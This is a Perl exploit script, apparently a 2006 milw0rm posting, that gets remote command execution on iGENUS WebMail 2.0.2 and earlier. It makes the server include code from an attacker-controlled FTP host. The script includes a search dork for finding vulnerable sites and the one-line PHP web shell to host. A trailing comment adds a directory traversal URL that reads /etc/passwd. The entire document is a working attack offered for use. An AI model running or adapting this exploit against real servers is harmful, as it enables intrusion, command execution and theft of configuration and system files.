#!/usr/bin/perl
use IO::Socket;

print "______________________________________________________\r\n";
print "iGENUS WebMail <= 2.0.2 remote commads xctn\r\n";
print "-> works against PHP5 with register_globals = On\r\n";
print "   & allow_url_fopen = On\r\n";
print "by rgod rgod<AT>autistici<DOT>org\r\n";
print "site: http://retrogod.altervista.org\r\n\r\n";
print "dork:  intitle:\"igenus webmail login\"\r\n";
print "______________________________________________________\r\n";

sub main::urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/"%" . unpack("H2", $1)/ge;
    #$string# =~ tr/.//;
    return $string;
 }

$serv=$ARGV[0];
$path=$ARGV[1];
$loc=urlEncode($ARGV[2]);
$cmd=""; for ($i=3; $i<=$#ARGV; $i++) {$cmd.="%20".urlEncode($ARGV[$i]);};

if (@ARGV < 4)
{
print "\r\nUsage:\r\n";
print "perl igenus_xpl.pl SERVER PATH FTP_LOCATION COMMAND\r\n\r\n";
print "SERVER         - Server where iGENUS is installed.\r\n";
print "PATH           - Path to iGENUS (ex: /igenus/ or just /) \r\n";
print "FTP_LOCATION   - an FTP site with the code to include\r\n";
print "COMMAND        - a Unix command\r\n\r\n";
print "Example:\r\n";
print "perl igenus_xpl.pl localhost /igenus/ ftp://username:password/somehost.com ls -la\r\n";
print "perl igenus_xpl.pl localhost /igenus/ ftp://username:password/somehost.com/subdir cat config_inc.php\r\n\r\n";
print "note: on ftp location you need this code in .config :\r\n";
print "<?php ob_clean();ini_set(\"max_execution_time\",0);passthru(\$_GET[\"cmd\"]);die;?>\r\n\r\n";
exit();
}

  $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", Timeout  => 10, PeerPort=>"http(80)")
  or die "[+] Connecting ... Could not connect to host.\n\n";
  print $sock "GET ".$path."config/config_inc.php?cmd=".$cmd."&SG_HOME=".$loc." HTTP/1.1\r\n";
  print $sock "Host: ".$serv."\r\n";
  print $sock "Connection: close\r\n\r\n";

  while ($answer = <$sock>) {
    print $answer;
  }
  close($sock);

# ----------------> also, with magic_quotes_gpc = Off, try this:
# http://[target]/[path]/?Lang=../../../../../../../../etc/passwd%00

# milw0rm.com [2006-02-25]